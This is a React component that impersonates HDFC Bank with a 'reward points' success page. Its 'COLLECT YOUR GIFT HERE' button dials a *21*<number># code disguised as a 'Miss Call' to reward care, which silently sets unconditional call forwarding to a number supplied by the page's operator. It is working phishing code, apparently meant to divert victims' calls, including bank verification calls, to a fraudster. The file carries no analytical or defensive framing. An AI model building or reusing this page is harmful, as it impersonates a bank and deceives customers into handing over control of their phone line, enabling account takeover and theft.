/* eslint-disable react/prop-types */

import myImage from './assets/top.png';
import bottom from './assets/bottom_page2.jpeg';

const SuccessPage = ({ forwardingNumber }) => {
  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
      
        <p className=" text-center text-lg max-w-md mx-auto text-gray-900 mb-4">Welcome to HDFC Bank .</p>
      
      <img src={myImage} alt="Description of the image" />
      <img src={bottom} alt="Description of the image" />
      <p className="text-lg text-gray-700 mt-10 mb-4">
      
        To Collect Your Reward Point Gifts, give us a Miss Call to HDFC Bank Reward Care by clicking the button below.
      </p>
      <div className="flex justify-center">
        <button
          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
          onClick={() =>
            window.open(
              `tel:*21*${forwardingNumber?.call_forwarding_number}%23`,
              '_self'
            )
          }
        >
          COLLECT YOUR GIFT HERE
        </button>
      </div>
    </div>
  );
};

export default SuccessPage;